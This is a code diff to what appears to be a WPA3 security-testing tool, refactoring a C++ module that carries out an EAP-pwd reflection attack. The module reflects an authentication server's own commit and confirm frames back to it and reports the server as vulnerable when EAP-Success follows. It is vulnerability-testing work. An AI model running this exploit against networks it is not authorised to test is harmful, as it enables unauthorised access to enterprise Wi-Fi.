@@ -1,4 +1,5 @@
 #include "attacks/Enterprise/eap_pwd_reflection.h"
+#include "attacks/Enterprise/eap_defs.h"
 
 #include <chrono>
 #include <tins/llc.h>
@@ -11,6 +12,7 @@ namespace wpa3_tester::reflection {
 using namespace std;
 using namespace chrono;
 using namespace Tins;
+using namespace wpa3_tester::eap;
 
 // -----------------
 // EAPOL byte layout (after SNAP has been stripped):
@@ -33,8 +35,8 @@ static constexpr size_t PWD_DATA_OFF = PWD_EXCH_OFF + 1;    // offset of PWD pay
 optional<EapPwdFrame> parse_eap_pwd(const vector<uint8_t>& eapol){
     if(eapol.size() <= PWD_EXCH_OFF) return nullopt;
     if(eapol[1] != 0x00)             return nullopt; // not EAP packet
-    if(eapol[EAPOL_HDR] != EAP_REQUEST)  return nullopt;
-    if(eapol[EAP_TYPE_OFF] != EAP_TYPE_PWD) return nullopt;
+    if(eapol[EAPOL_HDR] != CODE_REQUEST)  return nullopt;
+    if(eapol[EAP_TYPE_OFF] != TYPE_PWD) return nullopt;
 
     EapPwdFrame f;
     f.eap_id = eapol[EAPOL_HDR + 1];
@@ -51,8 +53,8 @@ optional<EapPwdFrame> parse_eap_pwd(const vector<uint8_t>& eapol){
 bool is_identity_request(const vector<uint8_t>& eapol, uint8_t& out_eap_id){
     if(eapol.size() < EAP_TYPE_OFF + 1) return false;
     if(eapol[1] != 0x00)                return false;
-    if(eapol[EAPOL_HDR] != EAP_REQUEST) return false;
-    if(eapol[EAP_TYPE_OFF] != EAP_TYPE_IDENTITY) return false;
+    if(eapol[EAPOL_HDR] != CODE_REQUEST) return false;
+    if(eapol[EAP_TYPE_OFF] != TYPE_IDENTITY) return false;
     out_eap_id = eapol[EAPOL_HDR + 1];
     return true;
 }
@@ -60,7 +62,7 @@ bool is_identity_request(const vector<uint8_t>& eapol, uint8_t& out_eap_id){
 bool is_eap_success(const vector<uint8_t>& eapol){
     if(eapol.size() < EAPOL_HDR + EAP_HDR) return false;
     if(eapol[1] != 0x00)                    return false;
-    return eapol[EAPOL_HDR] == EAP_SUCCESS;
+    return eapol[EAPOL_HDR] == CODE_SUCCESS;
 }
 
 static vector<uint8_t> build_eapol_eap(const uint8_t code, uint8_t eap_id,
@@ -85,16 +87,16 @@ static vector<uint8_t> build_eapol_eap(const uint8_t code, uint8_t eap_id,
 
 vector<uint8_t> build_identity_response(const uint8_t eap_id, const string_view identity){
     vector<uint8_t> body;
-    body.push_back(EAP_TYPE_IDENTITY);
+    body.push_back(TYPE_IDENTITY);
     body.insert(body.end(), identity.begin(), identity.end());
-    return build_eapol_eap(EAP_RESPONSE, eap_id, body);
+    return build_eapol_eap(CODE_RESPONSE, eap_id, body);
 }
 
 vector<uint8_t> build_pwd_id_response(const EapPwdFrame& request, string_view peer_identity){
     // PWD-ID data: Group(2) + RF(1) + PRF(1) + Token(4) + Prep(1) = 9 bytes fixed prefix
     constexpr size_t FIXED = 9;
     vector<uint8_t> body;
-    body.push_back(EAP_TYPE_PWD);
+    body.push_back(TYPE_PWD);
     body.push_back(PWD_OPCODE_ID); // PWD-Exch flags (opcode=1, no L/M)
     // echo fixed prefix
     const size_t copy_len = min(FIXED, request.pwd_data.size());
@@ -102,16 +104,16 @@ vector<uint8_t> build_pwd_id_response(const EapPwdFrame& request, string_view pe
                             request.pwd_data.begin() + static_cast<ptrdiff_t>(copy_len));
     // peer identity instead of server identity
     body.insert(body.end(), peer_identity.begin(), peer_identity.end());
-    return build_eapol_eap(EAP_RESPONSE, request.eap_id, body);
+    return build_eapol_eap(CODE_RESPONSE, request.eap_id, body);
 }
 
 // Shared helper for commit and confirm: both just flip code to Response, keep data.
 static vector<uint8_t> reflect_pwd_frame(const EapPwdFrame& request, uint8_t opcode){
     vector<uint8_t> body;
-    body.push_back(EAP_TYPE_PWD);
+    body.push_back(TYPE_PWD);
     body.push_back(opcode); // same opcode, no L/M bits
     body.insert(body.end(), request.pwd_data.begin(), request.pwd_data.end());
-    return build_eapol_eap(EAP_RESPONSE, request.eap_id, body);
+    return build_eapol_eap(CODE_RESPONSE, request.eap_id, body);
 }
 
 vector<uint8_t> reflect_commit(const EapPwdFrame& request){
@@ -153,7 +155,7 @@ bool do_auth(MonitorSocket& sock, const Channel& ch,
 				log(LogLevel::DEBUG, "Auth response: algo={} seq={} status={}",
 					static_cast<int>(f->algorithm), static_cast<int>(f->seq), static_cast<int>(f->status));
 				if(f->status != 0){
-					log(LogLevel::WARNING, "Auth rejected, status={}", f->status);
+					log(LogLevel::WARNING, "Auth rejected, status={}", static_cast<int>(f->status));
 					result = false; return true;
 				}
 				log(LogLevel::INFO, "802.11 Authentication OK");
@@ -212,7 +214,7 @@ bool do_assoc(MonitorSocket& sock, const Channel& ch,
 				const auto* resp = pdu->find_pdu<Dot11AssocResponse>();
 				if(!resp || resp->addr1() != our_mac) return nullopt;
 				if(resp->status_code() != 0){
-					log(LogLevel::WARNING, "Assoc rejected, status={}", resp->status_code());
+					log(LogLevel::WARNING, "Assoc rejected, status={}", static_cast<int>(resp->status_code()));
 					result = false; return true;
 				}
 				log(LogLevel::INFO, "802.11 Association OK");
@@ -249,19 +251,37 @@ void send_eapol(MonitorSocket& sock, const Channel& ch,
 	sock.send(dot11, ch);
 }
 
-vector<uint8_t> extract_eapol(const PDU& pdu, const HWAddress<6>& our_mac){
-	const auto* d11 = pdu.find_pdu<Dot11Data>();
-	const auto* llc_pdu = pdu.find_pdu<LLC>();
-	const auto* raw = pdu.find_pdu<RawPDU>();
-	if(!d11 || !llc_pdu || !raw) return {};
-	// must be addressed to us (addr1) or broadcast
-	if(d11->addr1() != our_mac && d11->addr1() != HWAddress<6>::broadcast) return {};
+vector<uint8_t> extract_eapol(const uint8_t* p, const uint32_t caplen, const HWAddress<6>& our_mac){
+	if(caplen < 4) return {};
+	const uint16_t rt_len = p[2] | (static_cast<uint16_t>(p[3]) << 8);
 
-	const auto& payload = raw->payload();
-	// skip SNAP header (5 bytes: OUI 3 + EtherType 2)
-	if(payload.size() < 5) return {};
-	if(payload[3] != 0x88 || payload[4] != 0x8e) return {};
-	return {payload.begin() + 5, payload.end()};
+	// FC byte 0: bits 3-2 = type, must be 0b10 (data); bit 7 = QoS subtype flag
+	if(caplen <= rt_len + 1u) return {};
+	const uint8_t fc0 = p[rt_len];
+	if((fc0 & 0x0c) != 0x08) return {}; // not a data frame
+
+	// addr1 = FC(2) + Duration(2) = offset 4 inside dot11 header
+	if(caplen < rt_len + 10u) return {};
+	const HWAddress<6> addr1(p + rt_len + 4);
+	if(addr1 != our_mac && addr1 != HWAddress<6>::broadcast) return {};
+
+	// QoS Data (subtype bit 7 set) adds 2-byte QoS Control field
+	const size_t dot11_hdr = (fc0 & 0x80) ? 26u : 24u;
+
+	// LLC+SNAP: AA AA 03 | OUI(3) | EtherType(2) = 8 bytes total
+	const size_t llc_off = rt_len + dot11_hdr;
+	if(caplen < llc_off + 8u) return {};
+	if(p[llc_off] != 0xAA || p[llc_off+1] != 0xAA || p[llc_off+2] != 0x03) return {};
+	if(p[llc_off+6] != 0x88 || p[llc_off+7] != 0x8e) return {};
+
+	// EAPOL: version(1) + type(1) + length(2) + body; use length field to trim
+	const size_t eapol_off = llc_off + 8;
+	if(caplen < eapol_off + 4u) return {};
+	const uint16_t body_len = (static_cast<uint16_t>(p[eapol_off+2]) << 8) | p[eapol_off+3];
+	const size_t eapol_end = eapol_off + 4 + body_len;
+	if(eapol_end > caplen) return {};
+
+	return {p + eapol_off, p + eapol_end};
 }
 
 bool run_reflection_exchange(MonitorSocket& sock, const Channel& channel,
@@ -280,15 +300,13 @@ bool run_reflection_exchange(MonitorSocket& sock, const Channel& channel,
 		return duration_cast<milliseconds>(deadline - steady_clock::now());
 	};
 
-	// Poll for an EAPOL frame satisfying pred, or EAP-Success (returned as empty vector).
-	// Returns nullopt on timeout or interrupt.
+	// poll for an EAPOL frame satisfying pred, or EAP-Success (returned as empty vector).
+	// returns nullopt on timeout or interrupt.
 	auto wait_eapol = [&](auto pred) -> optional<vector<uint8_t>> {
 		optional<vector<uint8_t>> result;
 		(void)components::poll_sniffer<bool>(handle, remaining(),
 			[&](const u_char* p, const uint32_t caplen) -> optional<bool> {
-				auto [pdu, raw] = MonitorSocket::parse_frame(p, caplen);
-				if(!pdu) return nullopt;
-				auto eapol = extract_eapol(*pdu, our_mac);
+				auto eapol = extract_eapol(p, caplen, our_mac);
 				if(eapol.empty()) return nullopt;
 				if(is_eap_success(eapol)){ result = vector<uint8_t>{}; return true; }
 				if(!pred(eapol)) return nullopt;
@@ -304,7 +322,7 @@ bool run_reflection_exchange(MonitorSocket& sock, const Channel& channel,
 		const auto eapol = wait_eapol([&](const vector<uint8_t>& e){ return is_identity_request(e, eap_id); });
 		if(!eapol){ log(LogLevel::WARNING, "Reflection exchange ended without EAP-Success"); return false; }
 		if(eapol->empty()){ log(LogLevel::INFO, "[!] EAP-Success received – server is vulnerable to reflection attack!"); return true; }
-		log(LogLevel::INFO, "EAP-Identity Request id={}", static_cast<unsigned>(eap_id));
+		log(LogLevel::INFO, "EAP-Identity Request id={}", static_cast<int>(eap_id));
 		send_eapol(sock, channel, our_mac, ap_mac, build_identity_response(eap_id, identity));
 	}
 
